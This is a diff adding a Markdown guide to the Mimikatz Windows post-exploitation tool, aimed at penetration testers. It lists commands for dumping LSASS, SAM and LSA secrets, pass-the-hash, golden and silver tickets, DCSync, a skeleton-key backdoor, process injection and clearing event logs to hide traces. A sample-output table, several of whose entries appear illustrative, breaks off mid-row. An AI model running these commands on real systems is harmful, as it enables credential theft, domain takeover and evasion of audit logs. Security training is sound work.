@@ -1,0 +1,376 @@
+---
+title: "Mimikatz"
+description: "Mimikatz tool guide; includes tool's purpose,primary uses,core features,data sources, common commands and example of command's usages."
+tags: ['windows', 'credentials', 'post-exploitation']
+---
+
+**Mimikatz** is an **open-source** post-exploitation tool designed for Windows operating systems that extracts plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory. Created by Benjamin Delpy, Mimikatz has become one of the most powerful and widely used tools for demonstrating Windows security weaknesses and performing credential theft attacks. It is essential for penetration testers assessing Windows environments and Active Directory security.
+
+**Here are the primary uses of Mimikatz:**
+
+  * **Credential Extraction:** Mimikatz extracts plaintext passwords, NTLM hashes, and other credentials from the Local Security Authority Subsystem Service (LSASS) process memory. This capability demonstrates the risk of storing credentials in memory and is critical for post-exploitation activities.
+
+  * **Pass-the-Hash Attacks:** The tool enables pass-the-hash attacks by extracting NTLM hashes and injecting them into new sessions, allowing authentication without knowing plaintext passwords. This technique is fundamental for lateral movement in Windows networks.
+
+  * **Kerberos Ticket Manipulation:** Mimikatz can extract, forge, and inject Kerberos tickets including TGTs (Ticket Granting Tickets) and service tickets. This enables pass-the-ticket attacks and persistence through golden and silver ticket creation.
+
+  * **Golden Ticket Creation:** The tool creates golden tickets using the krbtgt account hash, providing complete domain access and persistent backdoor capabilities. Golden tickets can remain valid even after password resets.
+
+  * **DCSync Attacks:** Mimikatz performs DCSync attacks to extract password hashes from domain controllers by impersonating a domain controller, eliminating the need for direct access to DC systems.
+
+  * **Privilege Escalation:** The tool includes various privilege escalation techniques and can bypass Windows security features, enabling administrators to test security controls and demonstrate exploitation paths.
+
+
+
+
+## Core Features​
+
+  * LSASS Memory Dumping
+  * Plaintext Password Extraction
+  * NTLM Hash Extraction
+  * Kerberos Ticket Extraction
+  * Pass-the-Hash Support
+  * Pass-the-Ticket Support
+  * Golden Ticket Creation
+  * Silver Ticket Creation
+  * DCSync Attack
+  * Skeleton Key Attack
+  * Credential Manager Extraction
+  * DPAPI Decryption
+  * Token Manipulation
+  * Privilege Escalation
+
+
+
+## Data sources​
+
+  * LSASS Process Memory
+  * Windows Credential Manager
+  * Kerberos Tickets (Memory)
+  * LSA Secrets
+  * SAM Database
+  * NTDS.dit (via DCSync)
+  * Active Directory
+  * Windows Registry
+  * Memory Dumps
+  * Cached Credentials
+
+
+
+## Common Mimikatz Commands​
+
+### 1\. Display Mimikatz Version​
+
+  * This command displays the current version of Mimikatz and basic system information.
+
+
+    
+    
+```
+mimikatz # version  
+```
+### 2\. Elevate Privileges​
+
+  * This command attempts to elevate privileges to SYSTEM level, required for many credential extraction operations.
+
+
+    
+    
+```
+mimikatz # privilege::debug  
+```
+### 3\. Extract All Credentials​
+
+  * This command extracts all available credentials from LSASS memory including plaintext passwords, hashes, and Kerberos tickets.
+
+
+    
+    
+```
+mimikatz # sekurlsa::logonpasswords  
+```
+### 4\. Dump LSASS Process​
+
+  * This command creates a dump of the LSASS process for offline analysis, useful when direct execution is restricted.
+
+
+    
+    
+```
+mimikatz # sekurlsa::minidump lsass.dmp  
+```
+### 5\. Extract Kerberos Tickets​
+
+  * This command extracts all Kerberos tickets from memory, including TGTs and service tickets for pass-the-ticket attacks.
+
+
+    
+    
+```
+mimikatz # sekurlsa::tickets  
+```
+### 6\. Export Kerberos Tickets​
+
+  * This command exports Kerberos tickets to files for later use or analysis on different systems.
+
+
+    
+    
+```
+mimikatz # sekurlsa::tickets /export  
+```
+### 7\. Pass-the-Hash​
+
+  * This command performs pass-the-hash by creating a new process with specified NTLM hash, enabling authentication without plaintext passwords.
+
+
+    
+    
+```
+mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd.exe  
+```
+### 8\. Pass-the-Ticket​
+
+  * This command injects a Kerberos ticket into the current session, enabling access to resources using stolen tickets.
+
+
+    
+    
+```
+mimikatz # kerberos::ptt <ticket_file>  
+```
+### 9\. Create Golden Ticket​
+
+  * This command creates a golden ticket using the krbtgt hash, providing persistent domain admin access.
+
+
+    
+    
+```
+mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500  
+```
+### 10\. Create Silver Ticket​
+
+  * This command creates a silver ticket for accessing specific services without contacting the domain controller.
+
+
+    
+    
+```
+mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<service_hash>  
+```
+### 11\. DCSync Attack​
+
+  * This command performs DCSync to extract password hashes from Active Directory by impersonating a domain controller.
+
+
+    
+    
+```
+mimikatz # lsadump::dcsync /user:<domain>\<username>  
+```
+### 12\. DCSync All Users​
+
+  * This command extracts password hashes for all domain users using DCSync, providing complete credential access.
+
+
+    
+    
+```
+mimikatz # lsadump::dcsync /domain:<domain> /all /csv  
+```
+### 13\. Dump SAM Database​
+
+  * This command dumps the local SAM database containing local user account hashes.
+
+
+    
+    
+```
+mimikatz # lsadump::sam  
+```
+### 14\. Dump LSA Secrets​
+
+  * This command extracts LSA secrets including service account credentials and cached domain credentials.
+
+
+    
+    
+```
+mimikatz # lsadump::secrets  
+```
+### 15\. Skeleton Key Attack​
+
+  * This command injects a skeleton key into domain controller memory, creating a backdoor password for all accounts.
+
+
+    
+    
+```
+mimikatz # misc::skeleton  
+```
+### 16\. Extract Credential Manager​
+
+  * This command extracts credentials stored in Windows Credential Manager, revealing saved passwords.
+
+
+    
+    
+```
+mimikatz # vault::list  
+```
+### 17\. DPAPI Decryption​
+
+  * This command decrypts DPAPI-protected data including saved passwords and certificates.
+
+
+    
+    
+```
+mimikatz # dpapi::cred /in:<credential_file>  
+```
+### 18\. Token Elevation​
+
+  * This command manipulates Windows access tokens to impersonate other users or elevate privileges.
+
+
+    
+    
+```
+mimikatz # token::elevate  
+```
+### 19\. List Available Tokens​
+
+  * This command lists all available access tokens in the system for potential impersonation.
+
+
+    
+    
+```
+mimikatz # token::list  
+```
+### 20\. Inject into Process​
+
+  * This command injects Mimikatz into a remote process for stealth and privilege escalation.
+
+
+    
+    
+```
+mimikatz # process::inject /pid:<pid>  
+```
+### 21\. Clear Event Logs​
+
+  * This command clears Windows event logs to remove traces of Mimikatz execution and credential theft.
+
+
+    
+    
+```
+mimikatz # event::clear  
+```
+### 22\. Dump Kerberos Keys​
+
+  * This command extracts Kerberos encryption keys from memory for offline cracking or ticket creation.
+
+
+    
+    
+```
+mimikatz # sekurlsa::ekeys  
+```
+### 23\. Export to File​
+
+  * This command redirects all Mimikatz output to a specified file for documentation or later analysis.
+
+
+    
+    
+```
+mimikatz # log <output_file>  
+```
+### 24\. Exit Mimikatz​
+
+  * This command exits the Mimikatz interactive console.
+
+
+    
+    
+```
+mimikatz # exit  
+```
+### 25\. Help and Usage Information​
+
+  * This command displays help information and available modules for Mimikatz.
+
+
+    
+    
+```
+mimikatz # help  
+```
+## Output Examples of Mimikatz Commands​
+
+Command| Example Usage| Function| Output Example  
+---|---|---|---  
+Version Check| `mimikatz # version`| Shows Mimikatz version.| `mimikatz 2.2.0 (x64) (Jul 29 2023) `   
+` "A La Vie, A L'Amour"`  
+Privilege Debug| `mimikatz # privilege::debug`| Enables debug privilege.| `Privilege '20' OK`  
+Logon Passwords| `mimikatz # sekurlsa::logonpasswords`| Extracts credentials.| `Username : john `   
+` Domain : CORP `   
+` Password : P@ssw0rd123 `   
+` NTLM : fc525c9683e8fe067095ba2ddc971889`  
+Kerberos Tickets| `mimikatz # sekurlsa::tickets`| Lists Kerberos tickets.| `[00000000] - 0x00000012 - aes256_hmac `   
+` Start/End/MaxRenew: 11/4/2024 10:00:00 ; 11/4/2024 20:00:00`  
+Export Tickets| `mimikatz # sekurlsa::tickets /export`| Exports tickets to files.| `[00000000] - 0x00000012 - aes256_hmac `   
+` * Saved to file: 0-00000000-john@krbtgt-CORP.LOCAL.kirbi`  
+Pass-the-Hash| `mimikatz # sekurlsa::pth /user:admin /domain:CORP /ntlm:fc525... /run:cmd`| Creates PTH session.| `user : admin `   
+` domain : CORP `   
+` program : cmd.exe `   
+` NTLM : fc525c9683e8fe067095ba2ddc971889`  
+Pass-the-Ticket| `mimikatz # kerberos::ptt ticket.kirbi`| Injects ticket.| `* File: 'ticket.kirbi': OK`  
+Golden Ticket| `mimikatz # kerberos::golden /user:admin /domain:CORP /sid:S-1-5-21... /krbtgt:abc... /id:500`| Creates golden ticket.| `User : admin `   
+` Domain : CORP (CORP.LOCAL) `   
+` SID : S-1-5-21-xxx `   
+` * saved to golden.kirbi`  
+Silver Ticket| `mimikatz # kerberos::golden /user:admin /domain:CORP /sid:S-1-5-21... /target:server /service:cifs /rc4:abc...`| Creates silver ticket.| `Service : cifs `   
+` Target : server.corp.local `   
+` * saved to silver.kirbi`  
+DCSync User| `mimikatz # lsadump::dcsync /user:CORP\Administrator`| Syncs user credentials.| `SAM Username : Administrator `   
+` Hash NTLM: fc525c9683e8fe067095ba2ddc971889 `   
+` ntlm- 0: fc525c9683e8fe067095ba2ddc971889`  
+DCSync All| `mimikatz # lsadump::dcsync /domain:CORP /all /csv`| Syncs all users.| `502;krbtgt;aad3b435b51404ee:b7e4c6f... `   
+` 500;Administrator;aad3b435b51404ee:fc525c9683...`  
+Dump SAM| `mimikatz # lsadump::sam`| Dumps SAM database.| `RID : 000001f4 (500) `   
+` User : Administrator `   
+` Hash NTLM: fc525c9683e8fe067095ba2ddc971889`  
+LSA Secrets| `mimikatz # lsadump::secrets`| Extracts LSA secrets.| `Secret : $MACHINE.ACC `   
+` cur/hex : fc525c9683e8fe067095ba2ddc971889`  
+Skeleton Key| `mimikatz # misc::skeleton`| Injects skeleton key.| `[*] Skeleton key patched successfully `   
+` [*] Default password: mimikatz`  
+Credential Manager| `mimikatz # vault::list`| Lists vault credentials.| `Domain : CORP `   
+` Username : john `   
+` Password : P@ssw0rd123`  
+DPAPI Decrypt| `mimikatz # dpapi::cred /in:cred.dat`| Decrypts DPAPI data.| `TargetName : Domain:target=server `   
+` UserName : admin `   
+` CredentialBlob : P@ssw0rd123`  
+Token Elevate| `mimikatz # token::elevate`| Elevates to SYSTEM.| `Token Id : 0 `   
+` User name : NT AUTHORITY\SYSTEM`  
+List Tokens| `mimikatz # token::list`| Lists available tokens.| `1. NT AUTHORITY\SYSTEM `   
+` 2. CORP\Administrator `   
+` 3. CORP\john`  
+Process Inject| `mimikatz # process::inject /pid:1234`| Injects into process.| `Process handle : PID 1234 `   
+` Injection OK`  
+Clear Logs| `mimikatz # event::clear`| Clears event logs.| `Security : Cleared `   
+` System : Cleared `   
+` Application: Cleared`  
+Kerberos Keys| `mimikatz # sekurlsa::ekeys`| Extracts Kerberos keys.| `Username : john `   
+` Domain : CORP `   
+` aes256_hmac : abc123... `   
+` aes128_hmac : def456...`  
+Minidump| `mimikatz # sekurlsa::minidump lsass.dmp`| Loads memory dump.| `Switch to MINIDUMP : 'lsass.dmp'`  
+Log Output| `mimikatz # log output.txt`| Logs to file.| `Using 'output.txt' for logfile : OK`  
+Coffee Break| `mimikatz # coffee`| Displays coffee.| ` ( ( `   
+` ) ) `   
+` ........ `   
+`
